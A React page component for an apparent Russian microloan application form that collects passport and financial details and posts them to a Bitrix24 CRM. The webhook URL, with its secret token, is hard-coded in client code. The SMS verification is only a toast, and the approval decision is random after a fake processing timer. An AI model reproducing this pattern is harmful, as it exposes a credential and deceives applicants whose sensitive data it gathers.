import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import Icon from "@/components/ui/icon";
import { useState, useEffect } from "react";
import { useToast } from "@/hooks/use-toast";
import ChatAssistant from "@/components/ChatAssistant";
import StepProgressBar from "@/components/loan/StepProgressBar";
import FormSteps, { FormData } from "@/components/loan/FormSteps";
import ProcessingScreen from "@/components/loan/ProcessingScreen";
import ResultScreen from "@/components/loan/ResultScreen";

type SubmitStatus = 'idle' | 'processing' | 'approved' | 'rejected';

const Index = () => {
  const [formData, setFormData] = useState<FormData>({
    firstName: '',
    lastName: '',
    middleName: '',
    birthDate: '',
    passportSeries: '',
    passportNumber: '',
    email: '',
    phone: '',
    phoneCode: '',
    address: '',
    city: '',
    income: '',
    workplace: '',
    loanAmount: 50000,
    loanTerm: 30
  });

  const [currentStep, setCurrentStep] = useState(1);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState<SubmitStatus>('idle');
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingTimer, setProcessingTimer] = useState(60);
  const [isPhoneVerified, setIsPhoneVerified] = useState(false);
  const [showCodeInput, setShowCodeInput] = useState(false);
  const [codeTimer, setCodeTimer] = useState(0);
  const { toast } = useToast();

  const handleInputChange = (field: keyof FormData, value: string | number | File) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const calculateLoan = () => {
    const principal = formData.loanAmount;
    const days = formData.loanTerm;
    const dailyRate = 0.01;
    
    const totalInterest = principal * dailyRate * days;
    const totalAmount = principal + totalInterest;
    const dailyPayment = totalAmount / days;

    return {
      totalAmount: Math.round(totalAmount),
      overpayment: Math.round(totalInterest),
      dailyPayment: dailyPayment
    };
  };

  const nextStep = () => {
    if (currentStep < 4) {
      setCurrentStep(prev => prev + 1);
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(prev => prev - 1);
    }
  };

  const sendVerificationCode = () => {
    setShowCodeInput(true);
    setCodeTimer(60);
    toast({
      title: "Код отправлен",
      description: "Проверьте SMS на указанном номере",
    });
  };

  useEffect(() => {
    if (codeTimer > 0) {
      const timer = setTimeout(() => setCodeTimer(prev => prev - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [codeTimer]);

  useEffect(() => {
    if (isProcessing && processingTimer > 0) {
      const timer = setTimeout(() => {
        setProcessingTimer(prev => prev - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (processingTimer === 0 && isProcessing) {
      setIsProcessing(false);
      const isApproved = Math.random() > 0.3;
      setSubmitStatus(isApproved ? 'approved' : 'rejected');
    }
  }, [processingTimer, isProcessing]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setSubmitStatus('processing');
    setIsProcessing(true);
    setProcessingTimer(60);

    // Отправка данных в Bitrix24
    try {
      await sendToBitrix24(formData);
    } catch (error) {
      console.error('Ошибка отправки:', error);
    }

    setIsSubmitting(false);
  };

  const sendToBitrix24 = async (data: FormData) => {
    const webhookUrl = 'https://b24-0vo5vw.bitrix24.ru/rest/1/q5be4cfha7ph0li8/';
    
    const response = await fetch(`${webhookUrl}crm.lead.add.json`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        fields: {
          TITLE: `Заявка МФО: ${data.firstName} ${data.lastName}`,
          NAME: data.firstName,
          LAST_NAME: data.lastName,
          EMAIL: [{ VALUE: data.email, VALUE_TYPE: 'WORK' }],
          PHONE: [{ VALUE: data.phone, VALUE_TYPE: 'WORK' }],
          ADDRESS: data.address,
          COMMENTS: `
            ФИО: ${data.lastName} ${data.firstName} ${data.middleName}
            Дата рождения: ${data.birthDate}
            Паспорт: ${data.passportSeries} ${data.passportNumber}
            Город: ${data.city}
            Место работы: ${data.workplace}
            Доход: ${data.income}
            Сумма займа: ${data.loanAmount}
          `,
          SOURCE_ID: 'WEB',
          SOURCE_DESCRIPTION: 'Заявка МФО с сайта'
        }
      })
    });

    if (!response.ok) {
      throw new Error('Ошибка отправки данных');
    }
  };

  const resetForm = () => {
    setFormData({
      firstName: '',
      lastName: '',
      middleName: '',
      birthDate: '',
      passportSeries: '',
      passportNumber: '',
      email: '',
      phone: '',
      phoneCode: '',
      address: '',
      city: '',
      income: '',
      workplace: '',
      loanAmount: 50000,
      loanTerm: 30
    });
    setCurrentStep(1);
    setSubmitStatus('idle');
    setIsSubmitting(false);
    setIsProcessing(false);
    setProcessingTimer(60);
    setIsPhoneVerified(false);
    setShowCodeInput(false);
    setCodeTimer(0);
  };

  const getStepTitle = () => {
    switch (currentStep) {
      case 1: return "Личные данные";
      case 2: return "Документы";
      case 3: return "Контактная информация";
      case 4: return "Финансовая информация";
      default: return "Заявка на займ";
    }
  };

  const getStepDescription = () => {
    switch (currentStep) {
      case 1: return "Заполните основную информацию";
      case 2: return "Загрузите документы";
      case 3: return "Укажите контакты";
      case 4: return "Выберите параметры займа";
      default: return "";
    }
  };

  // Экран обработки заявки
  if (submitStatus === 'processing') {
    return <ProcessingScreen processingTimer={processingTimer} />;
  }

  // Экран результата
  if (submitStatus === 'approved' || submitStatus === 'rejected') {
    return <ResultScreen submitStatus={submitStatus} resetForm={resetForm} />;
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-purple-900 py-8 relative overflow-hidden">
      {/* 3D фоновые элементы */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-20 left-10 w-32 h-32 bg-blue-400/20 rounded-full blur-xl animate-pulse"></div>
        <div className="absolute top-40 right-20 w-48 h-48 bg-purple-400/20 rounded-full blur-2xl animate-bounce" style={{animationDuration: '3s'}}></div>
        <div className="absolute bottom-20 left-1/4 w-24 h-24 bg-cyan-400/20 rounded-full blur-lg animate-pulse" style={{animationDelay: '1s'}}></div>
      </div>
      
      <div className="max-w-2xl mx-auto px-4 relative z-10">
        <form onSubmit={handleSubmit}>
          {/* 3D Прогресс-бар */}
          <StepProgressBar currentStep={currentStep} totalSteps={4} />

          {/* Логотип по центру */}
          <div className="text-center mb-8">
            <div className="inline-flex items-center gap-3 bg-white/10 backdrop-blur-sm rounded-2xl px-8 py-4 shadow-xl border border-white/20">
              <div className="w-12 h-12 bg-gradient-to-br from-green-400 to-emerald-600 rounded-xl flex items-center justify-center" style={{
                boxShadow: '0 8px 32px rgba(34, 197, 94, 0.4), inset 0 2px 4px rgba(255, 255, 255, 0.2)'
              }}>
                <Icon name="Banknote" size={24} className="text-white" />
              </div>
              <div className="text-left">
                <h1 className="text-2xl font-bold bg-gradient-to-r from-cyan-400 to-blue-400 bg-clip-text text-transparent">Деньги в Дом</h1>
                <p className="text-sm text-white/70">Быстрые займы онлайн</p>
              </div>
            </div>
          </div>

          <Card className="relative shadow-2xl border-0 rounded-3xl backdrop-blur-lg bg-gradient-to-br from-white/10 to-white/5 border border-white/20 transform transition-all duration-500 hover:scale-[1.02]" style={{
            boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.1), inset 0 1px 0 rgba(255, 255, 255, 0.2)'
          }}>
            {/* Блики и отражения */}
            <div className="absolute inset-0 rounded-3xl bg-gradient-to-br from-white/20 via-transparent to-transparent pointer-events-none"></div>
            <div className="absolute top-0 left-1/4 w-1/2 h-px bg-gradient-to-r from-transparent via-white/40 to-transparent"></div>
            
            <CardHeader className="text-center pb-6 relative">
              <CardTitle className="text-3xl font-bold bg-gradient-to-r from-cyan-400 via-blue-400 to-purple-400 bg-clip-text text-transparent mb-4 drop-shadow-lg flex items-center justify-center gap-3">
                <Icon name="CreditCard" size={32} className="text-cyan-400" />
                {getStepTitle()}
              </CardTitle>
              <p className="text-white/80 text-sm backdrop-blur-sm bg-white/10 rounded-full px-4 py-2 inline-block border border-white/20">
                {getStepDescription()}
              </p>
            </CardHeader>

            <CardContent className="p-8 space-y-6 relative">
              <FormSteps 
                currentStep={currentStep}
                formData={formData}
                handleInputChange={handleInputChange}
                calculateLoan={calculateLoan}
                sendVerificationCode={sendVerificationCode}
              />

              {/* 3D Навигация */}
              <div className="flex justify-between pt-8">
                {currentStep > 1 && (
                  <Button
                    type="button"
                    onClick={prevStep}
                    variant="outline"
                    className="rounded-full px-8 py-3 bg-white/10 backdrop-blur-sm border border-white/20 text-white hover:bg-white/20 transition-all duration-300 transform hover:scale-105 hover:shadow-2xl hover:shadow-blue-500/25"
                    style={{
                      boxShadow: 'inset 0 2px 4px rgba(0, 0, 0, 0.1), 0 4px 12px rgba(0, 0, 0, 0.1)'
                    }}
                  >
                    <Icon name="ChevronLeft" size={16} className="mr-2" />
                    Назад
                  </Button>
                )}
                
                <div className="ml-auto">
                  {currentStep < 4 ? (
                    <Button
                      type="button"
                      onClick={nextStep}
                      className="relative bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white rounded-full px-8 py-3 transition-all duration-300 transform hover:scale-105 hover:shadow-2xl hover:shadow-blue-500/50 overflow-hidden"
                      style={{
                        boxShadow: '0 8px 32px rgba(59, 130, 246, 0.4), inset 0 2px 4px rgba(255, 255, 255, 0.2)'
                      }}
                    >
                      <div className="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent"></div>
                      <span className="relative z-10 flex items-center">
                        Далее
                        <Icon name="ChevronRight" size={16} className="ml-2" />
                      </span>
                    </Button>
                  ) : (
                    <Button
                      type="submit"
                      disabled={isSubmitting}
                      className="relative bg-gradient-to-r from-emerald-500 to-green-600 hover:from-emerald-400 hover:to-green-500 disabled:opacity-50 text-white rounded-full px-8 py-3 transition-all duration-300 transform hover:scale-105 hover:shadow-2xl hover:shadow-green-500/50 overflow-hidden"
                      style={{
                        boxShadow: '0 8px 32px rgba(16, 185, 129, 0.4), inset 0 2px 4px rgba(255, 255, 255, 0.2)'
                      }}
                    >
                      <div className="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent"></div>
                      <span className="relative z-10">
                        {isSubmitting ? (
                          <div className="flex items-center gap-2">
                            <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                            Отправляем...
                          </div>
                        ) : (
                          <div className="flex items-center">
                            <Icon name="Send" size={16} className="mr-2" />
                            Подать заявку
                          </div>
                        )}
                      </span>
                    </Button>
                  )}
                </div>
              </div>
            </CardContent>
          </Card>
        </form>
      </div>
      
      {/* Чат-помощник */}
      <ChatAssistant />
    </div>
  );
};

export default Index;